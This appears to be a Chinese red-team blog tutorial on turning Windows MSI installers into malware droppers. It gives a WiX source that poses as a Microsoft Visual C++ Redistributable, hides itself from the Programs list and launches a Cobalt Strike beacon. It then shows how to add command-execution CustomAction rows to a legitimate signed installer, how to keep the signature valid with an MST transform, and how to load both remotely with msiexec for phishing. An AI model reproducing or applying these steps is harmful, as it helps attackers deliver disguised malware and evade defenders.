<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-AZQy1lSAaCpCgjs3sdutQ)

您的转发就是我更新的动力。

#### 简介

MSI 文件是 Windows Installer 的数据包，它实际上是一个数据库，包含安装一种产品所需要的信息和在很多安装情形下安装（和卸载）程序所需的指令和数据。MSI 文件将程序的组成文件与功能关联起来。此外，它还包含有关安装过程本身的信息。如目标文件夹路径、系统依赖项、安装选项和控制安装过程的属性。

需要注意的是它实际上是一个数据库。

MSI 安装程序可以使用 WiX 工具集来构建，这里面有一个属性我们需要格外注意:

```
<CustomAction>

```

CustomAction 标签可以让我们运行 VBS 脚本，DLL，EXE 等等。

#### 注意事项

MSI 可以在内存中运行内部的 VBScript/JScript 脚本。

MSI 可以运行内存中的. Net 程序集。

MSI 是通过提取内部的 EXE 文件到 C:\Windows\Installer\MSIXXX.tmp 来运行。

如下图:

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbuSlo6MhyrCUib1KiaWicntV1PmJmwYiaPzkIY0pwhb9wq7BV8VkicIm8wibA/640?wx_fmt=png&from=appmsg)

#### MSI 数据库了解

前面我们说到过 MSI 实际上是一个数据库，下面我们简单来了解一下。

工具下载地址:

```
https://lessmsi.activescott.com/

```

将 MSI 文件拖进去即可。

点击 Table View 查看表。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbgGEg23yuZ0Rc7eBuYlstboNd7yqn1qd8XseCmVgsMmRcmlFQtwPLTQ/640?wx_fmt=png&from=appmsg)

Component 里面包含了对文件的引用，可以在那个文件夹中找到那个文件。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbc8F2U9Dl49k2ZTiahT9OXsGrxsWRXAKcSlwoDxgmnURzXdBZSZTU6Kg/640?wx_fmt=png&from=appmsg)

CustomAction 表示自定义动作的表格，他里面包含了将要采取的所有行动。例如在系统中运行一些 DLL，运行一些脚本等等。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQb7dZibxOe9CZRtS1z2XtaFZecIO3DHMG8gO3DnicMHj7iaZWAcKxo6y9tA/640?wx_fmt=png&from=appmsg)

Environment 表示在安装过程中要使用的环境变量。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQb9nq0lG0vfnsGGNZTvK0ibMuohK1rwWCtuOJhicT6DUoYTJAXDjsmiaTRg/640?wx_fmt=png&from=appmsg)

File 表示文件列表以及文件名称等信息。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbavnT6ypgJmwHCvurYwkls7j3e0YGPjMCGRIwqhjibGFvcx7PPaDTPUw/640?wx_fmt=png&from=appmsg)

在安全的角度来说需要注意的是 InstallExecuteSequence 这个表，这个表表示安装执行的顺序，比如说你自定义了操作，你自定义的操作就需要来排序一下。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbgns6icGOUcaoHJecFXHs0IS3toaq3PicvJWFbicq0MQW6z6c1bCwUvHtg/640?wx_fmt=png&from=appmsg)

还有就是这个表，这个表和上面那个表差不多，这个表还列出了 MSI 安装时将要执行的所有操作。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbZ76cia74IDMk1053wQX3X42P8rGpzkpO3icoIPd6cQUNFM850VaARhibA/640?wx_fmt=png&from=appmsg)

Media

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQb2VwFuGnVJpXW3ImaM5LhkB2rZxicxNhQicMyBFjxFEvDyq5xXNAMU5YQ/640?wx_fmt=png&from=appmsg)

#### 制作 MSI 执行 EXE

首先创建一个 projects.wxs 文件。

如下: 如下已做解释 ！！！

```
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product >
        <Package Manufacturer="Microsoft Corporation" InstallerVersion="400" Compressed="yes" InstallPrivileges="limited" InstallScope="perUser" />
        <!-- 从“控制面板”程序列表中隐藏应用程序 -->
        <Property Value="1"/>
        <!-- 删除修复按钮 -->      
        <Property Value="yes" Secure="yes"/>
        <!-- 删除修改按钮 -->
        <Property Value="yes" Secure="yes"/>
        <Media Cabinet="fJZJXps.cab" EmbedCab="yes" CompressionLevel="high"/>
         <!-- 这里是控制MSI的安装位置 我们也可以在这里加一些环境变量 -->
        <SetDirectory Value="[%LOCALAPPDATA]\VcRedist"/>
        <!-- 定义目录结构 -->
        <Directory >
            <Directory/>
        </Directory>
        <!-- 将文件添加到安装程序包 -->
        <DirectoryRef>
            <Component Guid="AA0FBF6B-45F7-443D-8835-BDF4F3E57D47">
                <RemoveFile />
                <File Source="relaysec.txt" KeyPath="yes"/>
            </Component>
        </DirectoryRef>
        <!-- 告诉WiX安装文件 -->
        <Feature Title="Microsoft Visual C++ 2013 Redistributable (64) - 12.0.39659" Level="1">
            <ComponentRef/>
        </Feature>
        <!-- 安装后操作 -->
        <Binary SourceFile="Autoruns64.exe"/>
        <CustomAction Execute="deferred" BinaryKey="lmskBju" Return="asyncNoWait" ExeCommand="" Impersonate="yes" />
        <InstallExecuteSequence>
            <Custom Action="fdpcc" Before="InstallFinalize">NOT REMOVE</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>

```

如下解释:

1.  <Binary> 标签指定要包含在自定义操作中的 EXE。
    
2.  <CustomAction> 标签要求在安装前，安装期间，安装后要做些什么，这里我们指定的是运行这个 EXE 文件。
    
3.  指定操作的顺序以及何时启动。
    
4.  需要注意的是必须要有一个虚拟文件被添加到 MSI 安装程序中，这里指定的是 relaysec.txt
    
5.  最后隐藏我们添加 / 删除程序的列表
    

现在我们开始制作。

首先需要将上面的 WXS 文件编译为 WIXOBJ 文件。

这里需要用到 candle.exe 工具，网上很多可以直接安装。

```
candle.exe relaysec.wxs -arch x64

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbvicibvwygCPJSptwYCvDh064ndC04TSKUEZuegktKc8wSWAHjQGluuBA/640?wx_fmt=png&from=appmsg)

然后将 WXIOBJ 文件链接到 MSI 文件中。

这里使用到的也是 WSI 工具集中的 light.exe。

```
light.exe -ext WixUIExtension -cultures:en-us -dcl:high -out relaysec.msi relaysec.wixobj

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbPQhXzGJsdUkdQtVkQibSJou6KZvPgoNtK27Zye4mGmlqy0MOcK7CNsA/640?wx_fmt=png&from=appmsg)

最终成功生成 relaysec.msi，然后我们尝试运行。

可以看到进程链，这里我们的木马文件已经跑起来了。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbK0wJufAf7v1iaXRFEaDmfu2kibWcibsQmyKGfDzalkcS1lNurXxfyYH5A/640?wx_fmt=png&from=appmsg)

最终查看 Cobalt Strike，可以看到成功上线。

可以看到这里上线的进程是 MSIXXX.tmp。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbO9ga2AQl8TqAAGZ1glfku9AN4rcvNaibiaaXBSz9hj75SlpsT3wXlvHw/640?wx_fmt=png&from=appmsg)

需要注意的是它并不依赖于 relaysec.msi 和 beacon.exe 文件，所以当蓝队人员就算将文件删除，我们的 Beacon 也不会掉。

但是我们会发现当运行 relaysec.msi 的时候不会正常的去运行安装程序，而是直接退出了，这样的话未免有些惹人怀疑了。

#### 使用现有的 MSI 制作

我们可以添加行到现有的 MSI 表中，这样的话安装程序可以正常运行，而我们的 shellcode 也会正常运行。

这里需要使用到 SuperORCA 来进行实现。

在这之前我们需要了解一下标签的使用方式。

```
Binary 在MSI安装期间，在内存中保存二进制数据的表，我们可以使用它来运行NET，DLL文件等等。
CustomAction 执行安装前/之后的操作。
InstallExecuteSequence 安装执行的顺序，在安装过程中发生的操作按照顺序排序。
Component 描述应该将文件提取到那个目录中。
Media MSI内部的CAB文件，以及他们的启动序列。
Registry 包含所有要创建的注册表项和值，我们可以在安装时修改注册表。

```

SuperORCA.exe 下载地址:

```
https://superorca.software.informer.com/11.0/

```

其实更改的也是表中的内容，就和我们上面使用 lessmsi 工具查看到的是一样的。唯一不同的就是 SuperORCA 可以修改，lessmsi 修改不了只能查看。

如下图:

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQb1Bh7DoibFeUF6F7kQSwFP1gHn2153HbGnN0Zia2ibNLY0oxgHcpw2WQpg/640?wx_fmt=png&from=appmsg)

找到 CustomAction 表，右键 ->add Row，如果你不会填的话，可以参考微软官网。

```
https://learn.microsoft.com/zh-cn/windows/win32/msi/summary-list-of-all-custom-action-types

```

```
Action: 名称 这里可以随意定义
Type: 使用的类型，这里可以参考如下:
    VBscript 1126
      JScript  1125
      Run ExE  1218
      Execute command 1250
      Dotnet   65
      Run dropped file 1746
这里设置为1250 表示执行命令，当然你也可以选择其他。
Source: Source设置为INSTALLDIR 表示当前安装的目录。
Target: 这里表示目标也就是你要执行的命令。
最后确认即可。

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbw2I2XvdZWVD8PX92zKYS2PUKibtcnm8BjN4dkNaeSg2cvVo2GACryTA/640?wx_fmt=png&from=appmsg)

然后选择 InstallExecuteSequence 表，这个表示安装序列，我们需要将刚才设置的给他安排到序列中进行执行。

右键 ->add Row

```
Active: 这里的名称需要和上面设置的名称一致。
Condition: 条件表
Sequence: 这里填写的数字只要不超过安装结束的数字即可。

```

这里属性可以参考:

```
https://learn.microsoft.com/en-us/windows/win32/msi/customaction-table

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbYhyhGT7FXbdBL6SLM7JsyXbrOIZtG7XoYAsbMaR6FrVE7EHmxC0tXg/640?wx_fmt=png&from=appmsg)

添加成功之后我们尝试去安装。

可以看到当安装成功之前会执行我们的命令，也就是 calc。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbSEJ5mgYvSuMLfNawgicL6YAv47FoMkGiciaU3ibLjr4foibUMquKrIt5Hjw/640?wx_fmt=png&from=appmsg)

需要注意的是当我们更改了原始的 MSI 文件之后它的签名将无效。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbrLkd87ibhlGopTbcaGvklm8p9sPuLLmhhRCOy3uicl9z0NWcjad0ELkw/640?wx_fmt=png&from=appmsg)

那么如何既让签名有效又可以运行我们的 shellcode 呢？

#### MST 转换文件

MST 是 Windows 安装程序转换文件。

这里还是需要使用到 SuperOrca 工具。

选择 Tools->Transform Two Files

Base MSI File 表示正常的 MSI 文件，Modified MSI File 表示恶意的 msi 文件，最后点击 Create Transform 创建转换文件即可，最终会生成一个 calc.mst 的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbaicNMn90r8a9XOmibZ3HBQsg5Gtcr4mdspRNCVuO7zlEEhOmUaxHFJibQ/640?wx_fmt=png&from=appmsg)

然后我们使用这个转换文件去执行。

```
msiexec /i putty-0.67-installer.msi TRANSFORMS=calc.mst

```

然后我们点击安装一样可以执行。并且我们原始文件的签名是正常的。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbEdBAR6QzQ2LW5pWLSmAeBianxXASO8IXCFIXj1Fc5icXcfMYGFhfriahQ/640?wx_fmt=png&from=appmsg)

那么我们会想这样的话我还得将原始的 MSI 文件上传上去再去执行命令，岂不是很麻烦？如果钓鱼的话，目标会这么乖乖的听你话吗？

其实我们可以进行远程加载。

```
msiexec /i http://127.0.0.1:8080/putty-0.67-installer.msi TRANSFORMS=http://127.0.0.1:8080/calc.mst

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpZlrVO3R5a5jDRNw0ZXHQbwlnygyiauUq4e2iaNOKAxustq8O7nPibryib1lricNZLXF3CyHGiacuqRvmw/640?wx_fmt=png&from=appmsg)

这样的话就方便多了，我们可以使用. lnk 文件等等其他命令指向这条 msiexec 命令即可。